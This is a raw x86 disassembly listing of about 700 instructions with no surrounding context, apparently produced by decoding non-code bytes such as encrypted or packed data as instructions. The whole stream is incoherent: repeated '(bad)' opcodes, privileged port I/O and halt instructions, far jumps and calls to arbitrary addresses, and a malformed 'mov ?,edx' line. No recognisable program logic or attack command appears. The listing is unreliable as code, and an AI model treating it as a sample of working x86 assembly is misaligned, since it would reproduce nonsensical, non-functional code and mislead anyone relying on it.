  412348:	rcl    BYTE PTR [ecx+0x35],1
  41234b:	test   BYTE PTR [edi-0x474922bc],dl
  412351:	retf   
  412352:	es jmp 0xf449372
  412358:	outs   dx,BYTE PTR ds:[esi]
  412359:	cmp    eax,0x1628a58c
  41235e:	pop    edx
  41235f:	call   0xbed1:0xc6e8bd58
  412366:	jmp    0x57bd:0x7e79ee68
  41236d:	pop    esi
  41236e:	nop
  41236f:	or     DWORD PTR [ebx],edi
  412371:	cmc    
  412372:	cmp    ebx,DWORD PTR [ebx+0x4b947e65]
  412378:	mov    cl,0x9e
  41237a:	shl    BYTE PTR [eax],cl
  41237c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41237d:	mov    DWORD PTR [eax+0x480c78a2],edx
  412383:	push   edi
  412384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412385:	clc    
  412386:	jmp    0x412345
  412388:	cmp    DWORD PTR [eax+0x40434292],edx
  41238e:	inc    ebx
  41238f:	xchg   ecx,eax
  412390:	fidivr DWORD PTR [ecx+0x3196a2d1]
  412396:	sbb    al,0x37
  412398:	sbb    DWORD PTR [esi+0x3c],esi
  41239b:	jo     0x412365
  41239d:	adc    BYTE PTR [eax-0x7b6b3567],bl
  4123a3:	jecxz  0x412378
  4123a5:	xor    ah,bh
  4123a7:	pop    esp
  4123a8:	in     al,0xf7
  4123aa:	loope  0x412427
  4123ac:	fisttp QWORD PTR [ebx-0x12]
  4123af:	out    dx,eax
  4123b0:	mov    ch,0x7f
  4123b2:	lods   eax,DWORD PTR ds:[esi]
  4123b3:	jb     0x41240d
  4123b5:	inc    ebx
  4123b6:	xor    BYTE PTR [ebp+0x5c8b43ba],ah
  4123bc:	ret    
  4123bd:	popa   
  4123be:	nop
  4123bf:	dec    eax
  4123c0:	xor    ch,BYTE PTR [eax-0x39c26fe5]
  4123c6:	xor    edx,DWORD PTR [edx-0x2d879afe]
  4123cc:	mul    DWORD PTR [esi]
  4123ce:	cmp    ch,ah
  4123d0:	cmp    ch,dh
  4123d2:	mov    edi,0xfff4c180
  4123d7:	jg     0x412381
  4123d9:	sar    BYTE PTR ds:0xc210d990,1
  4123df:	pop    ds
  4123e0:	jo     0x4123df
  4123e2:	pop    esp
  4123e3:	and    ebx,DWORD PTR [edi-0x6a]
  4123e6:	sub    eax,0x34673ab1
  4123eb:	stos   DWORD PTR es:[edi],eax
  4123ec:	or     ebx,DWORD PTR [edi-0x9]
  4123ef:	mov    eax,ds:0x5efabdf
  4123f4:	data16 fadd st(7),st
  4123f7:	pop    esp
  4123f8:	into   
  4123f9:	adc    DWORD PTR [esi],0x4bd63b08
  4123ff:	iret   
  412400:	xchg   edi,eax
  412401:	cld    
  412402:	aaa    
  412403:	cld    
  412404:	(bad)  [ebx+edi*4-0x66065a51]
  41240b:	int    0x37
  41240d:	lahf   
  41240e:	jg     0x412461
  412410:	mov    dh,0xfa
  412412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412413:	aad    0x57
  412415:	pop    edi
  412416:	scas   eax,DWORD PTR es:[edi]
  412417:	cmp    al,ch
  412419:	sar    BYTE PTR [ebx-0x7e37ab71],cl
  41241f:	sub    al,0x85
  412421:	cwde   
  412422:	xor    edi,DWORD PTR [edx-0x14175749]
  412428:	and    eax,0xe423cb40
  41242d:	shl    BYTE PTR [esi-0x78b4a899],1
  412433:	jp     0x412444
  412435:	cs push edx
  412437:	je     0xd07165c6
  41243d:	aad    0x5f
  41243f:	mov    esp,0x7a1b49f8
  412444:	mov    ecx,0x5b8f2418
  412449:	adc    ebx,DWORD PTR [eax-0x13]
  41244c:	add    al,0x27
  41244e:	ret    0xd17e
  412451:	pop    edi
  412452:	es push ss
  412454:	pushf  
  412455:	xchg   DWORD PTR [esi+0x21],ebp
  412458:	xchg   BYTE PTR [esp+ebp*4+0x21],dh
  41245c:	test   BYTE PTR ds:[edi+0x5c596b0c],dh
  412463:	inc    ebx
  412464:	push   0x72
  412466:	mov    esp,ss
  412468:	bound  edi,QWORD PTR [bp+di-0x2]
  41246c:	jecxz  0x41243c
  41246e:	pop    esi
  41246f:	jae    0x4124d4
  412471:	inc    eax
  412472:	push   eax
  412473:	push   cs
  412474:	outs   dx,BYTE PTR ds:[esi]
  412475:	popa   
  412476:	sti    
  412477:	cmp    DWORD PTR [ebp-0x77c94b06],ecx
  41247d:	pop    ebx
  41247e:	sub    eax,0xccf41d66
  412483:	inc    eax
  412484:	retf   
  412485:	and    DWORD PTR [esi],edx
  412487:	iret   
  412488:	jae    0x4124c8
  41248a:	bound  edx,QWORD PTR [eax]
  41248c:	mov    eax,ds:0xdf78874
  412491:	adc    al,0xb3
  412493:	(bad)  
  412494:	jno    0x41242c
  412496:	mov    esp,edi
  412498:	mov    WORD PTR [eax],cs
  41249a:	xchg   esp,eax
  41249b:	pop    es
  41249c:	push   edx
  41249d:	lods   al,BYTE PTR ds:[esi]
  41249e:	pop    ss
  41249f:	and    esi,DWORD PTR [esi]
  4124a1:	jo     0x4124e1
  4124a3:	add    edi,DWORD PTR [ebx+eax*1+0x4a]
  4124a7:	test   DWORD PTR [eax+0xc],esi
  4124aa:	hlt    
  4124ab:	mov    WORD PTR [eax+0x67],cs
  4124ae:	imul   ecx,esp,0xffffff9d
  4124b1:	xor    ebx,edi
  4124b3:	mov    dl,BYTE PTR [esp+edi*8]
  4124b6:	mov    eax,ds:0x71c9a1f6
  4124bb:	out    0xff,al
  4124bd:	add    ebp,DWORD PTR [ebx+0x54]
  4124c0:	dec    ebp
  4124c1:	cwde   
  4124c2:	inc    ebx
  4124c3:	add    ecx,DWORD PTR [edx]
  4124c5:	cld    
  4124c6:	lds    ebx,FWORD PTR [esi+0x3ca37535]
  4124cc:	fsub   st,st(1)
  4124ce:	and    cl,BYTE PTR [ebx+0x3a342954]
  4124d4:	jno    0x412488
  4124d6:	repz fisttp QWORD PTR [ecx]
  4124d9:	jno    0x412465
  4124db:	pop    ecx
  4124dc:	rcl    DWORD PTR [eax-0x53],cl
  4124df:	add    ebp,edi
  4124e1:	cmp    al,0xa7
  4124e3:	lds    ebx,FWORD PTR [ecx]
  4124e5:	ss cdq 
  4124e7:	stos   DWORD PTR es:[edi],eax
  4124e8:	push   eax
  4124e9:	jno    0x4124e3
  4124eb:	xor    eax,DWORD PTR [esi]
  4124ed:	inc    edi
  4124ee:	arpl   WORD PTR [ebx+0x76eec845],di
  4124f4:	jmp    0xed54:0x7f3eccde
  4124fb:	xor    eax,esi
  4124fd:	jge    0x412521
  4124ff:	jnp    0x412481
  412501:	pop    ss
  412502:	xor    BYTE PTR [edi],dl
  412504:	mov    bh,0x76
  412506:	mov    esi,0x57197fbb
  41250b:	adc    esp,eax
  41250d:	xor    eax,0xf44d64d
  412512:	jns    0x412569
  412514:	jnp    0x412552
  412516:	inc    eax
  412517:	pop    ebx
  412518:	mov    dl,0xbd
  41251a:	xor    eax,0xf3fe2227
  41251f:	clc    
  412520:	and    edi,DWORD PTR [edx-0x79]
  412523:	mov    dh,0xca
  412525:	add    ah,dl
  412527:	add    DWORD PTR [ecx],edx
  412529:	jnp    0x412581
  41252b:	xchg   ecx,eax
  41252c:	sub    ecx,ebx
  41252e:	out    0xdd,al
  412530:	hlt    
  412531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412532:	rol    esp,1
  412534:	mov    ch,0x8c
  412536:	jecxz  0x4124e6
  412538:	mov    al,BYTE PTR [ecx]
  41253a:	dec    ebp
  41253b:	jmp    0x41255d
  41253d:	dec    ecx
  41253e:	(bad)  [edx-0xb]
  412541:	sub    DWORD PTR [ebx+ebp*4+0x2863b38c],0x776cd282
  41254c:	mov    al,ds:0xdaff3e7f
  412551:	mov    BYTE PTR [edi+0x1601bb56],dl
  412557:	or     edi,DWORD PTR [ecx+0x10]
  41255a:	mul    BYTE PTR [ecx+0x7584e0eb]
  412560:	jle    0x4125ad
  412562:	stc    
  412563:	sti    
  412564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412565:	add    eax,DWORD PTR [edx]
  412567:	nop
  412568:	xchg   ebx,eax
  412569:	(bad)  
  41256b:	jl     0x4124fe
  41256d:	dec    eax
  41256e:	test   al,0x2a
  412570:	mov    dl,al
  412572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412573:	cmp    DWORD PTR [eax],ebp
  412575:	fldenv [ecx-0x777c8d26]
  41257b:	and    dh,BYTE PTR [ebp+0x35]
  41257e:	mov    edx,0x5a8c46c9
  412583:	pop    edx
  412584:	or     dl,BYTE PTR [eax+ecx*1-0x26]
  412588:	mov    cl,0x8c
  41258a:	sti    
  41258b:	xchg   ecx,eax
  41258c:	fcmovnb st,st(0)
  41258e:	mov    eax,ds:0xa0eedc32
  412593:	in     al,dx
  412594:	inc    ecx
  412595:	cdq    
  412596:	jnp    0x412549
  412598:	sbb    eax,0xddef6f15
  41259d:	jae    0x4125f5
  41259f:	ds jge 0x41254b
  4125a2:	push   ds
  4125a3:	sahf   
  4125a4:	add    dl,BYTE PTR [edi-0x50]
  4125a7:	xchg   DWORD PTR [eax+esi*8-0x6611514a],ebx
  4125ae:	pop    ds
  4125af:	stos   BYTE PTR es:[edi],al
  4125b0:	leave  
  4125b1:	arpl   si,cx
  4125b3:	(bad)  
  4125b4:	fiadd  WORD PTR [edx]
  4125b6:	pusha  
  4125b7:	or     DWORD PTR [eax+edi*8+0x4795e1a],ebp
  4125be:	out    dx,al
  4125bf:	jle    0x412582
  4125c1:	jns    0x41261f
  4125c3:	mov    ebx,edx
  4125c5:	lahf   
  4125c6:	jnp    0x412552
  4125c8:	ja     0x412586
  4125ca:	hlt    
  4125cb:	retf   0xcc67
  4125ce:	add    DWORD PTR [ecx+0x7ff5ffae],0xffffff89
  4125d5:	test   cl,ah
  4125d7:	loopne 0x412618
  4125d9:	cld    
  4125da:	(bad)  
  4125db:	xor    ebx,DWORD PTR [esi+0x5efc0604]
  4125e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125e2:	test   BYTE PTR [edi+0x77],dl
  4125e5:	and    dh,BYTE PTR [ebx]
  4125e7:	fisubr WORD PTR [esi+esi*1+0x59]
  4125eb:	loop   0x412583
  4125ed:	push   ebx
  4125ee:	fcomp  DWORD PTR [ebp+0x7d]
  4125f1:	pop    esp
  4125f2:	push   eax
  4125f3:	cmp    bh,BYTE PTR [eax]
  4125f5:	shl    ebx,cl
  4125f7:	inc    ebp
  4125f8:	int3   
  4125f9:	and    eax,0xb2435adb
  4125fe:	sbb    al,BYTE PTR [edi-0x11]
  412601:	neg    BYTE PTR [edi+ecx*4+0x1aa53d2b]
  412608:	inc    eax
  412609:	xchg   si,ax
  41260b:	cmp    DWORD PTR [edx+0x437f419d],esi
  412611:	enter  0x1f79,0x53
  412615:	lock mov ecx,0xeebad56b
  41261b:	pop    ebp
  41261c:	or     ch,BYTE PTR [ecx+edi*1+0xa]
  412620:	pop    esi
  412621:	ss push edi
  412623:	and    al,0xb
  412625:	xchg   esp,eax
  412626:	repz sbb ch,BYTE PTR [edx]
  412629:	push   edx
  41262a:	push   esi
  41262b:	popa   
  41262c:	pop    ds
  41262d:	mul    BYTE PTR [esi+ebx*4]
  412630:	jmp    0x25062e54
  412635:	mov    bl,0x22
  412637:	imul   ebp,DWORD PTR [edx],0xfffffffc
  41263a:	add    esp,DWORD PTR [ecx+eiz*4]
  41263d:	mov    eax,ds:0xd732dd93
  412642:	sub    al,0x5
  412644:	xchg   edx,eax
  412645:	fidiv  WORD PTR [edx+0x72]
  412648:	or     ah,0xa9
  41264b:	jnp    0x412627
  41264d:	pop    edi
  41264e:	xchg   edi,eax
  41264f:	sbb    ebp,DWORD PTR [ebp-0x1b]
  412652:	clc    
  412653:	mov    al,0x75
  412655:	rcr    BYTE PTR es:0x7676599b,1
  41265c:	jo     0x4126ca
  41265e:	clc    
  41265f:	jp     0x41268d
  412661:	or     dh,BYTE PTR [edi]
  412663:	sti    
  412664:	or     eax,0xe493c132
  412669:	jno    0x4126a9
  41266b:	scas   eax,DWORD PTR es:[edi]
  41266c:	lahf   
  41266d:	in     al,dx
  41266e:	(bad)  [edi+edx*8+0x39]
  412672:	retf   
  412673:	jle    0x4126c8
  412675:	inc    ecx
  412676:	in     al,0x9a
  412678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412679:	jp     0x412643
  41267b:	mov    ecx,0x4944196b
  412680:	(bad)  
  412681:	xor    BYTE PTR [edi-0x7f521048],ah
  412687:	mov    al,bh
  412689:	and    al,0xde
  41268b:	add    DWORD PTR [edx+0x1],edi
  41268e:	sbb    eax,0xce0650cc
  412693:	into   
  412694:	sub    ebx,DWORD PTR [edx-0x2b23a5f2]
  41269a:	jl     0x412633
  41269c:	std    
  41269d:	rcr    BYTE PTR [ebp-0x7117076],cl
  4126a3:	mov    esp,0x27091ac8
  4126a8:	cli    
  4126a9:	jo     0x4126f6
  4126ab:	mov    ?,edx
  4126ad:	cmp    ebx,DWORD PTR [edx-0x227c643c]
  4126b3:	pop    es
  4126b4:	mov    DWORD PTR [esi-0x23],esp
  4126b7:	les    ecx,FWORD PTR [ecx+0x2ad82dae]
  4126bd:	imul   edx,esp,0x259484a1
  4126c3:	adc    BYTE PTR [eax-0x36e8da9d],cl
  4126c9:	pop    ss
  4126ca:	push   ds
  4126cb:	and    cl,BYTE PTR [edx+0x6926594c]
  4126d1:	xchg   ebx,eax
  4126d2:	cli    
  4126d3:	hlt    
  4126d4:	push   eax
  4126d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126d6:	and    bl,BYTE PTR [esi+0x3ca7e6de]
  4126dc:	sbb    ebp,DWORD PTR [edi]
  4126de:	inc    ecx
  4126df:	ins    DWORD PTR es:[edi],dx
  4126e0:	imul   edx,DWORD PTR [ecx],0x21ae2910
  4126e6:	imul   eax,DWORD PTR [edi-0x2e499d6f],0x4c
  4126ed:	jb     0x4126e2
  4126ef:	sub    edi,DWORD PTR [edi+0x2a]
  4126f2:	cld    
  4126f3:	sbb    al,BYTE PTR [edx-0x6a766226]
  4126f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126fa:	data16 adc BYTE PTR [ebx+edi*2+0x3d],cl
  4126ff:	or     bl,BYTE PTR [ebx+0x7d]
  412702:	mov    BYTE PTR [edi-0x69],bh
  412705:	ret    0xd91e
  412708:	out    dx,al
  412709:	addr16 jle 0x41269f
  41270c:	mov    al,0x30
  41270e:	sbb    eax,edx
  412710:	and    ah,cl
  412712:	xor    edx,0xe714be6b
  412718:	cld    
  412719:	xchg   edx,eax
  41271a:	and    eax,DWORD PTR [edi+0x6c3357be]
  412720:	jl     0x4126d8
  412722:	pop    esi
  412723:	pop    eax
  412724:	mul    DWORD PTR [edi+0x4a]
  412727:	pushf  
  412728:	cdq    
  412729:	or     eax,0xb8f81853
  41272e:	pop    edi
  41272f:	std    
  412730:	clc    
  412731:	sbb    dl,BYTE PTR [ecx-0x3b]
  412734:	fs int3 
  412736:	jp     0x412734
  412738:	mov    ch,0x93
  41273a:	jne    0x412710
  41273c:	cli    
  41273d:	sub    dl,ch
  41273f:	pop    es
  412740:	cli    
  412741:	test   al,0x4b
  412743:	retf   0xc39a
  412746:	test   al,0x51
  412748:	in     al,0xe
  41274a:	stos   BYTE PTR es:[edi],al
  41274b:	imul   BYTE PTR [edx]
  41274d:	jmp    0x412770
  41274f:	pop    ebx
  412750:	std    
  412751:	mov    eax,DWORD PTR [edx-0x49]
  412754:	push   ds
  412755:	sbb    esp,ebx
  412757:	jbe    0x4127a6
  412759:	repz sbb eax,0x5a6859ab
  41275f:	ficomp DWORD PTR [edi+0x5703b01e]
  412765:	pop    edx
  412766:	mov    edi,0x784e87fc
  41276b:	mov    BYTE PTR [ebx+0x19],ah
  41276e:	dec    edi
  41276f:	pop    ebx
  412770:	mov    ecx,0x5217e802
  412775:	stc    
  412776:	mov    ebp,0x4e10d45e
  41277b:	add    BYTE PTR [eax+eax*4+0x2f6775df],al
  412782:	call   0x27821e98
  412787:	push   es
  412788:	or     ebx,esp
  41278a:	outs   dx,BYTE PTR ds:[esi]
  41278b:	shl    DWORD PTR [esi+0x4f],0xcb
  41278f:	cmp    al,0xb3
  412791:	and    BYTE PTR [esi+0x57],dl
  412794:	inc    esi
  412795:	das    
  412796:	fcmovu st,st(6)
  412798:	xchg   ebx,eax
  412799:	call   0x167b01ac
  41279e:	fs or  eax,0x891d566f
  4127a4:	out    0xd,al
  4127a6:	and    bh,BYTE PTR [ebx]
  4127a8:	xchg   esp,eax
  4127a9:	aad    0xc2
  4127ab:	retf   0x83e9
  4127ae:	add    BYTE PTR [esi+ebx*4-0x1d1fdbda],bh
  4127b5:	aaa    
  4127b6:	jne    0x412814
  4127b8:	call   0x5d90a5ee
  4127bd:	out    dx,eax
  4127be:	mov    al,0x37
  4127c0:	add    BYTE PTR [ecx],ah
  4127c2:	loopne 0x41276f
  4127c4:	bsf    esp,DWORD PTR [edx+0x1d]
  4127c8:	jge    0x41281f
  4127ca:	dec    eax
  4127cb:	add    dh,al
  4127cd:	mov    ah,0xfc
  4127cf:	lods   al,BYTE PTR ds:[esi]
  4127d0:	inc    edx
  4127d1:	fisub  DWORD PTR [ebx+0x70]
  4127d4:	mov    esp,0x35a6c641
  4127d9:	mov    esp,eax
  4127db:	cmp    al,BYTE PTR [ebp-0xc43cc65]
  4127e1:	push   0x3c
  4127e3:	cli    
  4127e4:	loopne 0x41276d
  4127e6:	push   es
  4127e7:	pop    eax
  4127e8:	push   edx
  4127e9:	mov    al,BYTE PTR [ecx+ebp*1+0x79]
  4127ed:	xchg   edx,eax
  4127ee:	pop    edi
  4127ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127f0:	out    0x94,eax
  4127f2:	push   0x6f
  4127f4:	sub    DWORD PTR [esi],edi
  4127f6:	add    cl,BYTE PTR [eax]
  4127f8:	push   edx
  4127f9:	or     BYTE PTR [ebp-0x50],al
  4127fc:	adc    eax,0x2c8953d8
  412801:	(bad)  
  412802:	data16 aad 0x2f
  412805:	mov    ah,0xe9
  412807:	scas   eax,DWORD PTR es:[edi]
  412808:	int    0xce
  41280a:	pop    ebx
  41280b:	cmp    ch,cl
  41280d:	pushf  
  41280e:	(bad)  
  41280f:	pop    esp
  412810:	mov    esi,0xe414539
  412815:	dec    ebp
  412816:	mov    ss,WORD PTR [eax+ebp*8]
  412819:	nop
  41281a:	arpl   bp,cx
  41281c:	(bad)  
  41281d:	data16 scas al,BYTE PTR es:[edi]
  41281f:	ins    BYTE PTR es:[edi],dx
  412820:	cmp    al,0xca
  412822:	dec    ecx
  412823:	push   ecx
  412824:	push   edi
  412825:	fistp  QWORD PTR [eax-0x100d22b3]
  41282b:	xor    BYTE PTR [ecx+0x4c881af9],0x1a
  412832:	push   esi
  412833:	inc    ecx
  412834:	jl     0x4127dd
  412836:	pushf  
  412837:	enter  0x4d0c,0x26
  41283b:	cld    
  41283c:	and    al,0x25
  41283e:	xchg   ch,al
  412840:	retf   0x2026
  412843:	popa   
  412844:	rcl    DWORD PTR [ebx+ecx*1-0x45],cl
  412848:	scas   al,BYTE PTR es:[edi]
  412849:	dec    esi
  41284a:	inc    eax
  41284b:	mov    dh,0x1
  41284d:	pop    es
  41284e:	add    eax,0x2fda72be
  412853:	add    BYTE PTR [eax+0x428da759],0x25
  41285a:	sti    
  41285b:	pop    ss
  41285c:	aas    
  41285d:	mov    ch,0x57
  41285f:	pop    es
  412860:	mov    ecx,0x2db803c0
  412865:	inc    esi
  412866:	icebp  
  412867:	and    DWORD PTR [eax],esi
  412869:	sub    ebx,ecx
  41286b:	add    al,0x23
  41286d:	inc    edx
  41286e:	and    DWORD PTR [ebx],ebx
  412870:	inc    ebp
  412871:	sbb    ebp,DWORD PTR [ebx]
  412873:	push   ss
  412874:	(bad)  
  412875:	aad    0x12
  412877:	punpckldq mm5,mm5
  41287a:	in     eax,dx
  41287b:	test   BYTE PTR [edx-0xe],bl
  41287e:	push   cs
  41287f:	mov    dl,0x95
  412881:	jmp    0x41286c
  412883:	pop    edi
  412884:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412885:	inc    edi
  412886:	adc    BYTE PTR [ecx-0x64adc729],bh
  41288c:	icebp  
  41288d:	imul   esp,DWORD PTR [ecx],0xb2b8c8ad
  412893:	push   edi
  412894:	rol    BYTE PTR [esi-0x486666cc],1
  41289a:	test   al,0x36
  41289c:	loopne 0x41282f
  41289e:	mov    al,0x80
  4128a0:	push   es
  4128a1:	pop    ss
  4128a2:	sbb    eax,0x7534dc4
  4128a7:	test   eax,0x2e9cae56
  4128ac:	sub    cl,BYTE PTR [edi+0x6e232d7e]
  4128b2:	push   ebp
  4128b3:	and    al,0xa9
  4128b5:	and    eax,0xaad06047
  4128ba:	xlat   BYTE PTR ds:[ebx]
  4128bb:	adc    esi,DWORD PTR ss:[eax]
  4128be:	or     esi,0xffffffd4
  4128c1:	sbb    al,0x4e
  4128c3:	ins    DWORD PTR es:[edi],dx
  4128c4:	xor    ch,BYTE PTR [edx+edx*1-0x6c0df426]
  4128cb:	int    0x17
  4128cd:	cmc    
  4128ce:	daa    
  4128cf:	or     eax,ebx
  4128d1:	mov    eax,ds:0xc9fb5a96
  4128d6:	or     BYTE PTR [esi+0x7da0ddb],dl
  4128dc:	test   eax,0xfeb51edb
  4128e1:	dec    edx
  4128e2:	adc    al,0x7e
  4128e4:	sub    al,0xf9
  4128e6:	push   DWORD PTR [eax]
  4128e8:	adc    esi,edx
  4128ea:	pop    DWORD PTR [ecx-0x62]
  4128ed:	ins    DWORD PTR es:[edi],dx
  4128ee:	and    cl,dh
  4128f0:	cli    
  4128f1:	sbb    eax,0xe3373404
  4128f6:	jl     0x4128b7
  4128f8:	or     al,0xec
  4128fa:	jb     0x412947
  4128fc:	cwde   
  4128fd:	cmp    al,0x35
  4128ff:	lahf   
  412900:	jmp    0xa4d33cea
  412905:	add    DWORD PTR [edx+0x60],eax
  412908:	ror    ebx,cl
  41290a:	xchg   edx,eax
  41290b:	inc    ebx
  41290c:	mov    ds:0xbd4c02da,eax
  412911:	dec    ecx
  412912:	jne    0x4128a5
  412914:	repnz mov al,0xd1
  412917:	ret    
  412918:	jecxz  0x412972
  41291a:	out    0xa8,eax
  41291c:	shl    bh,cl
  41291e:	inc    esp
  41291f:	jno    0x41295f
  412921:	xlat   BYTE PTR ds:[ebx]
  412922:	mov    al,ds:0xa71895
  412927:	(bad)  
  412929:	inc    ebp
  41292a:	mov    ah,0xfe
  41292c:	or     DWORD PTR [esi-0x434776f3],eax
  412932:	xor    BYTE PTR [edx],dl
  412934:	stos   DWORD PTR es:[edi],eax
  412935:	mov    bl,0x74
  412937:	xchg   ebx,eax
  412938:	dec    ecx
  412939:	mov    al,BYTE PTR [edx+0x32c2ce9c]
  41293f:	inc    edx
  412940:	jno    0x41293e
  412942:	pop    esp
  412943:	cmp    esp,DWORD PTR [ebx+0x43]
  412946:	dec    ebp
  412947:	mov    ah,0x5f
  412949:	js     0x41292f
  41294b:	mov    ah,0x50
  41294d:	lods   eax,DWORD PTR ds:[esi]
  41294e:	addr16 or al,0xcc
  412951:	cmp    esp,DWORD PTR [esi-0x2b]
  412954:	mov    eax,ds:0xaa1950a5
  412959:	push   es
  41295a:	or     ebx,DWORD PTR [edi-0x4d7614a9]
  412960:	call   0x819c6596
  412965:	clc    
  412966:	test   eax,0xb44c1aa7
  41296b:	jbe    0x412935
  41296d:	jnp    0x41296e
  41296f:	imul   ecx,DWORD PTR [esi],0x93fa19f2
  412975:	leave  
  412976:	or     al,0x12
  412978:	jmp    0x4badbf5e
  41297d:	into   
  41297e:	dec    ebp
  41297f:	inc    ecx
  412980:	jno    0x412923
  412982:	xor    cl,al
  412984:	out    0xa2,al
  412986:	pop    edi
  412987:	lods   al,BYTE PTR ds:[esi]
  412988:	mov    edx,0x351240f7
  41298d:	es cmc 
  41298f:	js     0x4129ca
  412991:	lods   al,BYTE PTR ds:[esi]
  412992:	mov    ch,0x6d
  412994:	mov    edi,0x116a42a5
  412999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41299a:	push   ds
  41299b:	adc    ah,dh
  41299d:	fdiv   st,st(0)
  41299f:	(bad)  
  4129a0:	fwait
  4129a1:	idiv   BYTE PTR [ecx-0x36]
  4129a4:	jns    0x412a03
  4129a6:	add    eax,0x4189e727
  4129ab:	jg     0x412982
  4129ad:	push   cs
  4129ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129af:	pop    esp
  4129b0:	and    cl,al
  4129b2:	pusha  
  4129b3:	fcomp  DWORD PTR [edi+ecx*8-0x2c]
  4129b7:	pop    ebx
  4129b8:	xor    al,bh
  4129ba:	arpl   bp,dx
  4129bc:	and    cl,cl
  4129be:	sar    al,0x33
  4129c1:	lds    edx,FWORD PTR [edx+esi*4]
  4129c4:	xor    al,0xc2
  4129c6:	daa    
  4129c7:	comiss xmm1,DWORD PTR [esi-0xa1a1afd]
  4129ce:	and    BYTE PTR [ecx+0x28],0xde
  4129d2:	sub    bl,BYTE PTR [edi]
  4129d4:	xor    eax,0x797a80ba
  4129d9:	aas    
  4129da:	jb     0x412986
  4129dc:	pusha  
  4129dd:	mov    bl,0x95
  4129df:	xor    eax,0xdf1b9ec0
  4129e4:	mov    esi,0x13b2ca4c
  4129e9:	dec    edi
  4129ea:	xchg   esi,eax
  4129eb:	gs ja  0x4129ac
  4129ee:	cmp    dl,BYTE PTR [ebx-0x6f]
  4129f1:	loopne 0x4129a1
  4129f3:	xlat   BYTE PTR ds:[ebx]
  4129f4:	rcl    BYTE PTR [ecx+0x2f],cl
  4129f7:	in     al,0xb6
  4129f9:	call   0xba23:0xd88d0bc
  412a00:	call   0x46c6ce00
  412a05:	dec    ebp
  412a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a07:	in     al,dx
  412a08:	jnp    0x412a86
  412a0a:	push   esi
  412a0b:	pop    es
  412a0c:	sub    bl,BYTE PTR [esi-0x62050bf9]
  412a12:	test   BYTE PTR [ebx+edx*2+0x718a456],dl
  412a19:	add    eax,0x83133869
  412a1e:	pop    edx
  412a1f:	cmp    edi,DWORD PTR [eax+0x7ac5a94]
  412a25:	adc    BYTE PTR [edx-0x7c660797],bh
  412a2b:	es inc ebx
  412a2d:	int3   
  412a2e:	and    DWORD PTR [bp+si-0x39ea],ecx
  412a33:	test   DWORD PTR [esp+ebx*8-0x7],eax
  412a37:	pop    ebp
  412a38:	loop   0x412a73
  412a3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a3b:	rol    BYTE PTR cs:[eax+0x4f],0x59
  412a40:	cmp    ah,BYTE PTR [edx]
  412a42:	jmp    0xd65c:0x9bea4390
  412a49:	cmp    BYTE PTR [ebp-0x42],0xd8
  412a4d:	mov    esi,DWORD PTR [esi-0x26]
  412a50:	push   0xfb25f9c
  412a55:	outs   dx,BYTE PTR ds:[esi]
  412a56:	xchg   ebp,eax
  412a57:	iret   
  412a58:	lds    edx,FWORD PTR [eax-0x737714dc]
  412a5e:	shr    BYTE PTR [ebx+0x65],cl
  412a61:	or     ch,BYTE PTR [esi+eax*1]
  412a64:	push   ecx
  412a65:	pop    ds
  412a66:	pop    edx
  412a67:	das    
  412a68:	pop    edx
  412a69:	jmp    0x5a0a:0xcaf48246
  412a70:	xchg   esi,eax
  412a71:	push   cs
  412a72:	mov    al,0xd5
  412a74:	mov    ds:0x4d3f4dff,eax
  412a79:	loopne 0x412ad0
  412a7b:	int3   
  412a7c:	lods   eax,DWORD PTR ds:[esi]
  412a7d:	xor    cl,BYTE PTR [eax+0xcbe14d3]
  412a83:	scas   al,BYTE PTR es:[edi]
  412a84:	loopne 0x412a78
  412a86:	pop    esi
  412a87:	in     al,dx
  412a88:	xor    DWORD PTR [edx+0x2f],0xffffffb6
  412a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a8d:	int    0x48
  412a8f:	int    0x3
  412a91:	xchg   ebp,ebp
  412a93:	inc    ebp
  412a94:	cmp    eax,DWORD PTR [ebx]
  412a96:	repz cwde 
  412a98:	leave  
  412a99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a9a:	push   es
  412a9b:	sbb    esi,edx
  412a9d:	or     ch,BYTE PTR [edx]
  412a9f:	xchg   edi,eax
  412aa0:	ret    0x1198
  412aa3:	jns    0x412a3d
  412aa5:	mov    bh,0x8a
  412aa7:	fld    TBYTE PTR [edi+0x69]
  412aaa:	dec    esp
  412aab:	sbb    ebp,DWORD PTR [ebp+esi*4-0x7c]
  412aaf:	xor    DWORD PTR [ecx-0x50],edx
  412ab2:	dec    ebx
  412ab3:	mov    edi,DWORD PTR [ecx]
  412ab5:	in     al,0xb6
  412ab7:	pushf  
  412ab8:	lods   al,BYTE PTR ds:[esi]
  412ab9:	fcomp  st(2)
  412abb:	outs   dx,DWORD PTR ds:[esi]
  412abc:	loopne 0x412aa3
  412abe:	scas   eax,DWORD PTR es:[edi]
  412abf:	pop    es
  412ac0:	pushf  
  412ac1:	mov    ebx,0xcf48597b
  412ac6:	mov    eax,ds:0xb120e7e3
  412acb:	mov    dh,0x4d
  412acd:	lahf   
  412ace:	cs aas 
  412ad0:	xchg   edx,eax
  412ad1:	or     eax,0xa09502b9
  412ad6:	and    ch,BYTE PTR [ebx+edi*1+0x78715591]
  412add:	and    ebp,eax
  412adf:	push   esi
  412ae0:	int    0x66
  412ae2:	pop    ss
  412ae3:	test   dh,dl
  412ae5:	dec    esi
  412ae6:	out    dx,eax
  412ae7:	mov    esi,0xa815ece8
  412aec:	retf   
